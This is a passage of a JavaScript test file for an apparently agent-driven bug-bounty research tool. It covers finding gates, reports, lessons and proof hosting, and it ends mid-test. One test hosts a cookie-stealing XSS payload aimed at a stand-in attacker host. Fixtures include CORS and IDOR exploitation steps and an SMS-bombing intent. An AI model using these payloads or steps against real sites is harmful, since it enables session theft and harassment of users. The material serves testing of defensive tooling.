  await h.run("src_set_infra", { key: "burpMcpPort", value: "9499" }, parent);
  let burpFollowed = null;
  const burpResult = await h.commands.get("src-burp-test").handler({ rawInput: "", agent: { session: { id: "pcmd" }, followup: (m) => { burpFollowed = m; } } });
  assert.equal(burpResult.kind, "error", "closed port must fail fast host-side");
  assert.match(burpResult.text, /不可达|MCP Server/);
  assert.equal(burpFollowed, null, "closed port must not wake the agent");

  // --- /src-proxy-test without proxy configured -> direct answer, no AI ---
  let proxyFollowed = null;
  const proxyResult = await h.commands.get("src-proxy-test").handler({ rawInput: "", agent: { session: { id: "pcmd" }, followup: (m) => { proxyFollowed = m; } } });
  assert.equal(proxyResult.kind, "success");
  assert.match(proxyResult.text, /未配置 HTTP 代理/);
  assert.equal(proxyFollowed, null, "proxy probe must not wake the agent");

  // --- [local.12] viewSrcState works pre-goal so fresh sessions can configure infra ---
  const freshView = viewSrcState(JSON.parse(JSON.stringify(srcInitialState)));
  assert.equal(freshView.goal, null);
  assert.equal(freshView.infra.burpMcpPort, "9876");
  assert.deepEqual(freshView.counts, { intents: 0, facts: 0, findings: 0, assets: 0, coverage: 0, research: 0, checkpoints: 0, observations: 0, userTodos: 0, pendingApprovals: 0, testAccounts: 0, domainNotes: 0 });

  // --- [local.12] tool outputs must survive lossless JSON snapshotting ---
  // scan_surface non-stopped path previously emitted stopped:undefined -> "value is not lossless JSON"
  assert.equal(isJsonValue({ baseUrl: "https://x.test", requested: 1, responses: 1, hints: 0, preflight: { status: 200, headers: [], challenge: false, protection: false }, requiresDecision: false, results: [{ path: "/", status: 200, contentType: "text/html", length: 10, protectionSignal: false }] }), true, "scan_surface success shape must be lossless");
  // test_bypass error path previously emitted status:undefined via spread overwrite
  assert.equal(isJsonValue([{ method: "GET", path: "/a", headers: {}, body: "", note: "", phase: "variant", error: "timeout" }]), true, "test_bypass error shape must be lossless");
  // and the old buggy shapes must actually fail (guards the guard)
  assert.equal(isJsonValue({ stopped: void 0 }), false);
  assert.equal(isJsonValue([{ status: void 0, error: "x" }]), false);
});

test("[local.13] burp SSE handshake probe: closed port fails fast; live SSE endpoint passes without AI", async () => {
  const h = harness();
  const parent = h.exec("sse1");
  // 端口上没有任何东西：TCP 阶段直接失败，文本带 ① 编号
  await h.run("src_set_infra", { key: "burpMcpPort", value: "9553" }, parent);
  let woke = null;
  const closed = await h.commands.get("src-burp-test").handler({ rawInput: "", agent: { session: { id: "sse1" }, followup: (m) => { woke = m; } } });
  assert.equal(closed.kind, "error");
  assert.match(closed.text, /①TCP 探测失败/);
  assert.equal(woke, null);

  // 起一个假 SSE 服务：HTTP 200 + text/event-stream + 立即发 endpoint 事件
  const http = await import("node:http");
  const server = http.createServer((req, res) => {
    if (req.url === "/sse") {
      res.writeHead(200, { "content-type": "text/event-stream" });
      res.write("event: endpoint\ndata: \"session\\n\"\n\n");
    } else {
      res.writeHead(404); res.end();
    }
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  await h.run("src_set_infra", { key: "burpMcpPort", value: String(port) }, parent);
  const okResult = await h.commands.get("src-burp-test").handler({ rawInput: "", agent: { session: { id: "sse1" }, followup: (m) => { woke = m; } } });
  assert.equal(okResult.kind, "success");
  // [local.17] 文案改为桥端到端验证说明（直探只证扩展端点活着）
  assert.match(okResult.text, /②SSE 握手通过/);
  assert.match(okResult.text, /自愈桥/);
  assert.ok(woke, "SSE pass wakes the agent for tool-layer verification");
  const wokeText = JSON.stringify(woke);
  // [local.17] 端到端验证改为经自愈桥：tools_list + get_proxy_http_history
  assert.match(wokeText, /get_proxy_http_history/);
  server.close();
  server.closeAllConnections();

  // 非 SSE 服务（普通 404 页）：TCP 过但握手败，不扰 AI
  const server2 = http.createServer((req, res) => { res.writeHead(404, { "content-type": "text/html" }); res.end("<html>nope</html>"); });
  await new Promise((resolve) => server2.listen(0, "127.0.0.1", resolve));
  const port2 = server2.address().port;
  await h.run("src_set_infra", { key: "burpMcpPort", value: String(port2) }, parent);
  let woke2 = null;
  const sseFail = await h.commands.get("src-burp-test").handler({ rawInput: "", agent: { session: { id: "sse1" }, followup: (m) => { woke2 = m; } } });
  assert.equal(sseFail.kind, "error");
  assert.match(sseFail.text, /②SSE 握手失败/);
  assert.equal(woke2, null, "SSE failure must not wake the agent");
  server2.close();
  server2.closeAllConnections();
});

test("[local.13] src_fetch_policy fetches and strips HTML; finalize warns on pending todos and thin impact", async () => {
  const h = harness();
  const parent = h.exec("pol1");
  assert.equal(h.tools.has("src_fetch_policy"), true, "src_fetch_policy registered");

  // 假规则页
  const http = await import("node:http");
  const server = http.createServer((req, res) => {
    res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
    res.end("<html><head><script>var x=1;</script></head><body><h1>评分规则</h1><p>严重：RCE；&nbsp;高：敏感数据泄露</p><!--comment--></body></html>");
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  const result = await h.run("src_fetch_policy", { url: `http://127.0.0.1:${port}/rules` }, parent);
  assert.equal(result.status, 200);
  assert.match(result.text, /评分规则/);
  assert.match(result.text, /严重：RCE/);
  assert.doesNotMatch(result.text, /<h1>|<p>|script>/);
  assert.equal(result.text.includes("var x"), false, "script content dropped");
  server.close();

  // finalize：pending 待办 + impact <40 字 都要出 warning
  await h.run("src_add_goal", { target: "example.test", objective: "policy gate" }, parent);
  const goalState = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: goalState.goal.id }, parent);
  const intentId = intent.id;
  await h.run("src_update_intent", { intentId, status: "completed" }, parent);
  // pending 用户待办
  await h.run("src_user_todo", { title: "请登录提供会话", kind: "auth-session" }, parent);
  // 一个 finding（impact 只有 5 字，触发 thin-impact warning）
  const factEvidence4 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "GET / with Origin 反射 -> ACAO:*", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId, title: "CORS 配置错误", severity: "medium", impact: "配置不安全", affectedScope: "https://example.test", remediation: "修复 CORS", pocEvidence: ["raw poc"], reproducibleSteps: ["step1"], rawRequest: "GET / HTTP/1.1\r\nHost: example.test\r\n\r\n", victimImpact: "已登录用户的隐私响应可被第三方站点跨域读取且全程无感知，存在批量收集风险", attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户访问", concreteLossEvidence: [factEvidence4] }, parent);
  const state1 = await h.run("src_state", {}, parent);
  const findingId = state1.findings[0]?.id;
  assert.ok(findingId, "finding recorded");
  await h.run("src_record_research", { intentId, category: "web", hypothesis: "cors misconfig on example.test", findingId, status: "verified" }, parent);
  const fin = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  /* [local.20] pending 待办从 warning 升级为 blocker：ready=false 且待办出现在 blockers。 */
  assert.equal(fin.ready, false, "pending todo is now a blocker");
  const allWarnings = [...fin.blockers, ...fin.warnings].join("\n");
  assert.match(allWarnings, /未完成的用户待办/, "pending todo warning present");
  assert.match(allWarnings, /impact 危害论证过短/, "thin impact warning present");
});


test("[local.14] /src-infra-copy copies latest other session's infra overrides; no source -> friendly message", async () => {
  /* SrcStore caches the opened domain in a module-level map shared across harnesses; drop it so this
     test's fresh MemoryDomain is actually adopted instead of a previous test's tables. */
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  assert.equal(h.commands.has("src-infra-copy"), true, "src-infra-copy registered");
  const source = h.exec("sess-old");
  const target = h.exec("sess-new");

  // 本用例独享新打开的 MemoryDomain，无历史遗留数据；无任何来源 -> 友好提示
  const none = await h.commands.get("src-infra-copy").handler({ rawInput: "", agent: target.agent });
  assert.equal(none.kind, "success");
  assert.match(none.text, /没有可复用的基础设施/);

  // 源会话保存两项（其中一项随后清空恢复默认，不应被复制）
  await h.commands.get("src-infra").handler({ rawInput: "proxyUrl http://192.0.2.88:7893", agent: source.agent });
  await h.commands.get("src-infra").handler({ rawInput: "testPhone 13800138000", agent: source.agent });
  await h.commands.get("src-infra").handler({ rawInput: "testPhone -", agent: source.agent });

  // 目标会话一键沿用：直写 + 合成投影事件 + 不打扰 agent
  let followed = null;
  target.agent.followup = (message) => { followed = message; };
  const copied = await h.commands.get("src-infra-copy").handler({ rawInput: "", agent: target.agent });
  assert.equal(copied.kind, "success");
  assert.match(copied.text, /已沿用上次会话的基础设施（1 项）/);
  assert.match(copied.text, /proxyUrl=http:\/\/192\.0\.2\.88:7893/);
  assert.doesNotMatch(copied.text, /testPhone/, "cleared override must not be copied");
  assert.equal(followed, null, "/src-infra-copy must NOT wake the agent");
  const infra = await h.run("src_get_infra", {}, target);
  assert.equal(infra.infra.proxyUrl, "http://192.0.2.88:7893", "override landed in storage");
  assert.equal(infra.infra.testPhone, "", "untouched key stays default");

  // 合成 tool/call 与直写一致（投影 fold 可见）
  const callEvents = h.sessions.get("sess-new").events.filter((event) => event.type === "tool/call");
  assert.equal(callEvents.length, 1);
  assert.deepEqual(callEvents[0].data, { name: "src_set_infra", arguments: JSON.stringify({ key: "proxyUrl", value: "http://192.0.2.88:7893" }) });

  // 投影视图端到端：目标会话视图里能看到沿用来的值
  let state = JSON.parse(JSON.stringify(srcInitialState));
  state = applySrcEvent(state, { type: "tool/call", data: callEvents[0].data });
  assert.equal(viewSrcState(state).infra.proxyUrl, "http://192.0.2.88:7893");

  // 再沿用一次：仍以 sess-old 为源（自己不算来源），幂等无害
  const again = await h.commands.get("src-infra-copy").handler({ rawInput: "", agent: target.agent });
  assert.equal(again.kind, "success");
  assert.match(again.text, /proxyUrl=http:\/\/192\.0\.2\.88:7893/, "re-copy stays sourced from the other session");
  const eventsAfter = h.sessions.get("sess-new").events.filter((event) => event.type === "tool/call");
  assert.ok(eventsAfter.length >= 2, "each copy appends its synthetic events");
});

test("[local.15] finalize 受限完成声明后 src_state/src_graph 输出仍是 lossless JSON（undefined 属性被剥离）", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("ll1");
  await h.run("src_add_goal", { target: "example.test", objective: "lossless gate" }, parent);
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: state.goal.id }, parent);
  await h.run("src_update_intent", { intentId: intent.id, status: "completed" }, parent);
  // allowIncomplete=true 触发 upsertCoverage({ assetId: void 0, ... }) —— 此前会把 undefined 写进内存记录，
  // 污染后续 src_state/src_graph 的 lossless 输出（真实事故：session-349ed2ec turn3 两工具连续失败）。
  await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "用户指示停止" }, parent);
  // 直接检查内存表里的受限完成声明行不含值为 undefined 的自有属性
  const covTable = h.domain.table("coverage");
  for (const [, row] of covTable.entries()) {
    for (const [key, value] of Object.entries(row)) assert.notEqual(value, void 0, `coverage row key ${key} must not be undefined`);
  }
  // 且两个读路径的完整输出都通过官方 lossless 校验
  const { isJsonValue } = await import("@deepseek-ai/dsh-session");
  const after = await h.run("src_state", {}, parent);
  assert.equal(isJsonValue(after), true, "src_state output must be lossless after restricted-completion coverage");
  const graph = await h.run("src_graph", {}, parent);
  assert.equal(isJsonValue(graph), true, "src_graph output must be lossless after restricted-completion coverage");
});

test("[local.15] 智能代理路由：非名单域名直连、名单域名走代理", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("route1");
  // 本地目标服务：若请求到达则证明走了直连（代理地址必败）
  const http = await import("node:http");
  const server = http.createServer((req, res) => { res.writeHead(200, { "content-type": "text/plain" }); res.end("direct-hit"); });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  // 配置一个必然连不上的代理
  await h.run("src_set_infra", { key: "proxyUrl", value: "http://127.0.0.1:1" }, parent);
  // 非名单域名（127.0.0.1）：直连成功，不受必败代理影响
  const fetched = await h.run("src_fetch_policy", { url: `http://127.0.0.1:${port}/policy` }, parent);
  assert.equal(fetched.status, 200);
  assert.match(fetched.text, /direct-hit/);
  // 名单域名（github.com → PROXY_REQUIRED_HOST_SUFFIXES 命中）：必须经代理 → 必败代理导致失败，证明代理生效
  await assert.rejects(
    () => h.run("src_fetch_policy", { url: "https://github.com/robots.txt" }, parent),
    /ECONNREFUSED|CONNECT|fetch failed|aggregate error/i,
  );
  server.close();
});

test("[local.15] src_recover_child 无 checkpoint 子代理也可唤醒；额度限制与 intent 状态回写不变", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("rec1");
  await h.run("src_add_goal", { target: "example.test", objective: "recover" }, parent);
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "短信轰炸验证", detail: "d", goalId: state.goal.id }, parent);
  // 关键回归：子代理从未提交 checkpoint（首轮就因 API 失败）也能唤醒——此前报
  // "requires a child checkpoint linked to the specified parent intent"
  const first = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "继续短信轰炸验证" }, parent);
  assert.equal(first.attempt, 1);
  assert.ok(first.messageId, "followup queued");
  const second = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "再次尝试" }, parent);
  assert.equal(second.attempt, 2);
  assert.equal(h.ctx.subagents.followupCalls.length, 2, "two followups queued for the same child");
  // [local.16] 额度 2→4：供应商波动/网络不稳定属基础设施故障，应继续唤醒续跑
  const third = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "供应商恢复了继续" }, parent);
  assert.equal(third.attempt, 3);
  const fourth = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "最后一次" }, parent);
  assert.equal(fourth.attempt, 4);
  await assert.rejects(
    () => h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "第五次" }, parent),
    /recovery limit reached/,
  );
  // 唤醒把 intent 从 failed 拉回 running
  const after = await h.run("src_state", {}, parent);
  assert.equal(after.intents.find((row) => row.id === intent.id).status, "running");
});

test("[local.16] src_update_finding 重写字段：store 直写 + fold 投影同步 + 标题冲突拒绝", async () => {
  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("upd1");
  await h.run("src_add_goal", { target: "example.test", objective: "update" }, parent);
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "CORS 验证", detail: "d", goalId: state.goal.id }, parent);
  const factEvidence5 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "GET /api/profile Origin 反射 -> ACAC true", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: intent.id, title: "CORS 配置不安全", severity: "low", impact: "太短", affectedScope: "全站", remediation: "收紧", pocEvidence: ["e1"], reproducibleSteps: ["GET /"], victimImpact: "已登录用户的个人资料可被第三方站点静默读取且无感知，存在隐私批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户访问", concreteLossEvidence: [factEvidence5] }, parent);
  // 重写：impact/victimImpact/severity
  const upd = await h.run("src_update_finding", {
    findingId: "finding-1",
    severity: "medium",
    impact: "攻击者托管恶意页面诱导已登录用户访问，JS 以受害者 Cookie 读取 /api/profile 返回的姓名、手机号与订单摘要，可批量收集平台用户资料",
    victimImpact: "受害者为该站已登录用户；个人资料被第三方站点静默读取且全程无任何感知",
    reproducibleSteps: ["GET /api/profile with Origin: https://evil.example", "观察 ACAO 反射 + ACAC true"]
  }, parent);
  assert.deepEqual(upd.updated.sort(), ["impact", "reproducibleSteps", "severity", "victimImpact"]);
  const after = await h.run("src_state", {}, parent);
  const finding = after.findings.find((row) => row.id === "finding-1");
  assert.equal(finding.severity, "medium");
  assert.ok(finding.impact.includes("诱导已登录用户访问"), "impact rewritten");
  assert.ok((finding.victimImpact ?? "").includes("无任何感知"), "victimImpact written");
  assert.equal(finding.reproducibleSteps.length, 2, "steps replaced");
  // 标题冲突：新建第二个 finding 后改名为同名应拒绝
  await h.run("src_add_finding", { intentId: intent.id, title: "第二个漏洞", severity: "low", impact: "x".repeat(50), affectedScope: "s", remediation: "r", pocEvidence: ["e2"], reproducibleSteps: ["GET /"], victimImpact: "已登录用户的资料可被第三方站点静默读取且无感知，存在批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户访问", concreteLossEvidence: [factEvidence5] }, parent);
  await assert.rejects(
    () => h.run("src_update_finding", { findingId: "finding-2", title: "cors 配置不安全" }, parent),
    /同名 finding/,
  );
  // 未知 finding id 给出友好错误
  await assert.rejects(
    () => h.run("src_update_finding", { findingId: "finding-99", title: "nope" }, parent),
    /先调 src_state/,
  );
  // 空字符串解除资产关联 + asset 校验
  await assert.rejects(
    () => h.run("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-404" }, parent),
    /asset|资产/,
  );
});

test("[local.25] finding 准入闸：危害链三要素缺一拒绝 + 不可解析证据拒绝 + info 移除与弱信号路由", async () => {
  const h = harness();
  const parent = h.exec("gate25");
  await h.run("src_add_goal", { target: "https://example.test", objective: "准入闸验证", authorization: "SRC" }, parent);
  const intent = await h.run("src_add_intent", { title: "CORS 验证", detail: "d", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: intent.id, status: "completed" }, parent);
  const factEvidence6 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "登录态 GET /api/profile -> 200 {\"phone\":\"138****\"}", confidence: 0.9 }, parent)).id;
  const base = {
    intentId: intent.id,
    title: "CORS 反射",
    severity: "low",
    impact: "攻击者可托管恶意页面诱导已登录用户访问，跨域读取响应内容并批量收集平台用户资料用于精准诈骗",
    affectedScope: "全站",
    remediation: "收紧 CORS 白名单",
    pocEvidence: ["GET / with Origin: https://evil.example -> ACAO 反射 + ACAC true"],
    reproducibleSteps: ["curl -H 'Origin: https://evil.example' https://example.test/"]
  };
  // 缺 victimImpact → 拒绝
  await assert.rejects(
    () => h.run("src_add_finding", { ...base, attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户点击", concreteLossEvidence: [factEvidence6] }, parent),
    /victimImpact|受害者/,
  );
  // 缺 attackPrerequisites → 拒绝
  await assert.rejects(
    () => h.run("src_add_finding", { ...base, victimImpact: "已登录用户的个人资料被第三方站点静默读取且全程无感知，存在批量泄露风险", concreteLossEvidence: [factEvidence6] }, parent),
    /attackPrerequisites|利用前提/,
  );
  // 缺 concreteLossEvidence → 拒绝
  await assert.rejects(
    () => h.run("src_add_finding", { ...base, victimImpact: "已登录用户的个人资料被第三方站点静默读取且全程无感知，存在批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面诱导用户点击" }, parent),
    /concreteLossEvidence|损失证据/,
  );
  // 证据 id 不可解析 → 拒绝（服务端校验存在性）
  await assert.rejects(
    () => h.run("src_add_finding", { ...base, victimImpact: "已登录用户的个人资料被第三方站点静默读取且全程无感知，存在批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面诱导用户点击", concreteLossEvidence: ["fact-999"] }, parent),
    /不可解析|concreteLossEvidence/,
  );
  // src_submit 省略 severity → mapper 回退 info → 准入闸给出弱信号路由信息
  const childGate = h.exec("child-gate", "gate25");
  const { intentId: _omit, severity: _omitSev, ...submitFinding } = { ...base, victimImpact: "已登录用户的个人资料被第三方站点静默读取且全程无感知，存在批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面诱导用户点击", concreteLossEvidence: [factEvidence6] };
  await assert.rejects(
    () => h.run("src_submit", { intentId: intent.id, facts: [], assets: [], findings: [submitFinding] }, childGate),
    /severity=info 已移除|research/,
  );
  // 三要素齐全 + 真实证据指针 → 通过，新字段落库
  await h.run("src_add_finding", { ...base, title: "CORS 反射致资料泄露", victimImpact: "已登录用户的姓名手机号等资料被第三方站点静默读取且全程无感知，可被批量收集倒卖", attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户点击；厂商规则若要求自有域则此条不提交", concreteLossEvidence: [factEvidence6] }, parent);
  const state = await h.run("src_state", {}, parent);
  const finding = state.findings.find((row) => row.id === "finding-1");
  assert.ok(finding, "合格 finding 已入库");
  assert.ok((finding.attackPrerequisites ?? "").includes("自有域"), "attackPrerequisites persisted");
  assert.deepEqual(finding.concreteLossEvidence, [factEvidence6], "concreteLossEvidence persisted");
  // src_update_finding 可重写两字段；severity=info 被 schema 拒绝
  const upd = await h.run("src_update_finding", { findingId: finding.id, attackPrerequisites: "更新后的前提：需厂商自有域钓鱼页；任意外域场景按厂商规不收", concreteLossEvidence: [] }, parent);
  assert.ok(upd.updated.includes("attackPrerequisites") && upd.updated.includes("concreteLossEvidence"));
  await assert.rejects(() => h.run("src_update_finding", { findingId: finding.id, severity: "info" }, parent), /invalid arguments|info/);
});

test("[local.16] buildReport 双视角呈现：有 victimImpact 输出两行；缺失时给占位提示；finalize 缺 victimImpact 警告", async () => {
  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("rep1");
  await h.run("src_add_goal", { target: "example.test", objective: "report" }, parent);
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "越权验证", detail: "d", goalId: state.goal.id }, parent);
  const childRep = h.exec("child-rep", "rep1");
  await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "done", facts: [], assets: [], findings: [] }, childRep);
  const factEvidence7 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "GET /api/order/2 as user A -> order of user B 含收货人地址电话", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", {
    intentId: intent.id,
    title: "越权读取他人订单",
    severity: "high",
    impact: "攻击者遍历订单 ID 即可拉取任意用户订单的收货人、地址与电话，可用于精准诈骗或倒卖数据，危害全量用户",
    victimImpact: "受害用户的收货地址与手机号泄露，可能遭遇诈骗骚扰且无法察觉泄露源头",
    attackPrerequisites: "攻击者仅需注册普通买家账号并遍历订单 ID，无需管理权限",
    concreteLossEvidence: [factEvidence7],
    affectedScope: "全部用户订单",
    remediation: "服务端校验归属",
    pocEvidence: ["GET /api/order/2 as user A -> order of user B"],
    reproducibleSteps: ["登录账号 A", "GET /api/order/2"]
  }, parent);
  // 直接检查报告渲染。
  const report = await h.run("src_report", {}, parent);
  assert.ok(report.markdown.includes("**漏洞名称**：越权读取他人订单"), "标准模板名称行");
  assert.ok(report.markdown.includes("③ 利用过程：攻击者遍历订单 ID"), "利用过程 in 攻击链③");
  assert.ok(report.markdown.includes("⑤ 受害者影响：受害用户的收货地址"), "受害者影响 in 攻击链⑤");
  // 缺失场景：第二个 finding 不带 victimImpact
  await h.run("src_add_intent", { title: "信息泄露复核", detail: "d", goalId: state.goal.id }, parent).catch(() => {});
  const intents = await h.run("src_state", {}, parent);
  const intent2 = intents.intents.find((row) => row.title === "信息泄露复核");
  if (intent2 !== void 0) {
    const childRep2 = h.exec("child-rep2", "rep1");
    await h.run("src_submit", { intentId: intent2.id, stage: "completed", summary: "done", facts: [], assets: [], findings: [] }, childRep2);
    await h.run("src_update_finding", { findingId: "finding-1", victimImpact: "" }, parent);
  }
  const report2 = await h.run("src_report", {}, parent);
  assert.ok(!report2.markdown.includes("⑤ 受害者影响"), "空 victimImpact 不渲染⑤受害者影响行（动态模板：空步骤不占位）");
});

test("[local.16] src_record_lesson/read/search：沉淀合并更新 + goal 索引注入 + finalize 未沉淀警告", async () => {
  const dir = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  process.env.DSH_SRC_LESSONS_DIR = dir;
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("les1");
  // goal 时注入内置经验索引（内置目录随仓库走）
  const goal = await h.run("src_add_goal", { target: "example.test", objective: "lessons" }, parent);
  assert.ok(Array.isArray(goal.lessonIndex), "lesson index present on goal");
  assert.ok(goal.lessonIndex.some((line) => line.includes("CORS")), `builtin cors indexed: ${JSON.stringify(goal.lessonIndex)}`);
  // 沉淀新经验
  const rec = await h.run("src_record_lesson", {
    id: "idor-test",
    vulnType: "水平越权（IDOR）",
    scenario: "接口按自增 ID 取资源且仅校验登录态",
    verificationPlaybook: "双账号 A/B 登录，A 的会话请求 B 的资源 id，比对响应",
    acceptanceCriteria: "A 能读到 B 私有数据即成立，附双方 raw 包",
    pitfalls: "最初只测了未登录访问被拒就下结论——补了双账号对照后才收录"
  }, parent);
  assert.equal(rec.updatedExisting, false);
  // 同 slug 再沉淀 → 合并更新而非新建
  const rec2 = await h.run("src_record_lesson", {
    id: "idor-test",
    vulnType: "水平越权（IDOR）",
    scenario: "同上+补充：uuid 场景也可通过历史接口枚举",
    verificationPlaybook: "双账号 A/B 对照",
    acceptanceCriteria: "读到 B 私有数据"
  }, parent);
  assert.equal(rec2.updatedExisting, true);
  const files = await fsPromises.readdir(dir);
  assert.equal(files.filter((f) => f.startsWith("idor-test")).length, 1, "merged into one file");
  const text = await fsPromises.readFile(nodePath.join(dir, files[0]), "utf8");
  assert.ok(text.includes("# 水平越权（IDOR）") && text.includes("uuid 场景"), "content updated");
  assert.ok(/<!--\s*lesson-meta:\s*\{/.test(text), "meta comment present");
  // read：沉淀优先
  const read = await h.run("src_read_lesson", { id: "idor-test" }, parent);
  assert.equal(read.source, "distilled");
  assert.ok(read.text.includes("uuid 场景"));
  // search
  const search = await h.run("src_search_lessons", { query: "越权" }, parent);
  assert.ok(search.hits.some((hit) => hit.file === "idor-test"), "search finds distilled lesson");
  // 空 hits 分支不抛错（render 引用参数曾用错变量名）
  const empty = await h.run("src_search_lessons", { query: "不存在的关键词xyz" }, parent);
  assert.equal(empty.hits.length, 0, "empty hits returned");
  const searchTool = h.tools.get("src_search_lessons");
  const rendered = searchTool.output.render({ query: "不存在的关键词xyz" }, empty);
  assert.ok(rendered[0].text.includes("经验库无"), "empty-hit render text ok");
  // sessionLessons：本会话已沉淀 → finalize 不再出经验 warning；src_report 附沉淀节
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "越权验证", detail: "d", goalId: state.goal.id }, parent);
  const childLes = h.exec("child-les", "les1");
  await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "ok", facts: [], assets: [], findings: [] }, childLes);
  const factEvidence8 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "GET /resume/2 -> 200 求职者姓名电话邮箱", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", {
    intentId: intent.id,
    title: "越权读取简历",
    severity: "high",
    impact: "攻击者遍历简历 ID 可读取任意求职者姓名电话邮箱等隐私数据并批量倒卖，危害全量用户隐私安全",
    victimImpact: "求职者的姓名电话邮箱被陌生人读取，存在被诈骗与骚扰风险且无从察觉",
    attackPrerequisites: "攻击者仅需注册普通账号并遍历简历 ID，无需管理权限",
    concreteLossEvidence: [factEvidence8],
    affectedScope: "全部简历",
    remediation: "校验归属",
    pocEvidence: ["raw"],
    reproducibleSteps: ["step"],
    rawRequest: "GET /resume/2 HTTP/1.1\nHost: x"
  }, parent);
  let finalized = false;
  try {
    await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
    finalized = true;
  } catch (error) {
    // blockers 可能拦（checkpoint 已建），warning 只在成功路径返回——用 message 判别
    assert.ok(!/未沉淀/.test(String(error?.message ?? "")), "no lessons warning in blocker path");
  }
  if (finalized) {
    // 成功时确认没有经验相关 warning
  }
  const report = await h.run("src_report", {}, parent);
  assert.ok(report.markdown.includes("本次沉淀的经验"), "report appends lessons section");
  assert.ok(report.markdown.includes("idor-test"), "lesson id listed");
});

test("[local.16] src_serve_proof/src_stop_serve 生命周期：HTTP 托管 + 访问日志 + TTL 上限 + 跨会话隔离", async () => {
  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("srv1");
  await h.run("src_add_goal", { target: "example.test", objective: "serve" }, parent);
  const started = await h.run("src_serve_proof", { payload: "<script>fetch('http://attacker/'+document.cookie)</script>", filename: "poc.html", ttlSeconds: 999999 }, parent);
  assert.equal(started.ttlSeconds, 86400, "TTL clamped to max");
  assert.ok(started.serveId.startsWith("serve-srv1-"), "session-scoped serveId");
  assert.ok(/^http:\/\/\d+\.\d+\.\d+\.\d+:\d+\/poc\.html$/.test(started.url), "LAN url shape: " + started.url);
